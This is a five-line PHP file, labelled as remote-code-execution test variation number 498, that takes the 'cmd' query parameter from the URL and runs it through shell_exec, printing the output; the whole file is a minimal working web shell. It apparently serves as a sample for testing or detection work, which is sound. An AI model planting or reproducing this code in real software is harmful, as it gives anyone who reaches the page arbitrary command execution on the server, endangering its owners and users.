<?php
// RCE test variation #498
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>